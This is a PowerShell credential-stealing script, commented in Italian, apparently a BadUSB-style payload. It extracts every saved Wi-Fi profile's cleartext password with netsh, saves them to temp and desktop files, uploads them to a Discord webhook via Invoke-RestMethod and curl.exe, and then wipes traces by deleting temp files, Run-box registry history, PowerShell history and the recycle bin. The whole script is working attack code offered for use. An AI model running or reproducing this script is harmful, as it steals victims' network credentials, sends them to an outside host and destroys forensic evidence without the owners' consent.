############################################################################################################################################################

# Recupera i nomi dei profili Wi-Fi salvati
$wifiProfilesNames = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}

# Crea una stringa per raccogliere tutte le password
$passwordsOutput = ""

# Per ogni profilo Wi-Fi, tenta di ottenere la password
foreach ($profile in $wifiProfilesNames) {
    try {
        # Recupera le informazioni del profilo Wi-Fi
        $profileDetails = netsh wlan show profile name="$profile" key=clear

        # Estrarre la password
        $password = $profileDetails | Select-String "Key Content\W+\:(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
        
        # Se la password è trovata, aggiungila all'output
        if ($password) {
            $passwordsOutput += "Profile: $profile`nPassword: $password`n`n"
        } else {
            $passwordsOutput += "Profile: $profile`nPassword: NOT FOUND`n`n"
        }
    }
    catch {
        # Se c'è un errore con un profilo, registralo e continua
        $passwordsOutput += "Profile: $profile`nPassword: ERROR - Profile not found or inaccessible`n`n"
    }
}

# Salva le password (o gli errori) in un file temporaneo
$tempFilePath = "$env:TEMP/wifi-pass.txt"
$passwordsOutput > $tempFilePath

# Crea una copia del file sul desktop per backup
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "wifi-pass-backup.txt")
$passwordsOutput > $desktopPath

############################################################################################################################################################

# Funzione per caricare il file su Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
      'username' = $env:username
      'content' = $text
    }

    # Invia solo testo, se fornito
    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Invia il file, se fornito
    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Carica il file su Discord, se è specificato il webhook
if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file $tempFilePath
}

############################################################################################################################################################

# Funzione per pulire la cartella temporanea e cancellare tracce
function Clean-Exfil { 
    # Vuota la cartella temporanea
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

    # Cancella la cronologia della casella Esegui
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

    # Cancella la cronologia di PowerShell
    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Svuota il cestino
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

if (-not ([string]::IsNullOrEmpty($ce))) {
    Clean-Exfil
}

############################################################################################################################################################

# Rimuove il file temporaneo creato dopo il caricamento
Remove-Item $tempFilePath
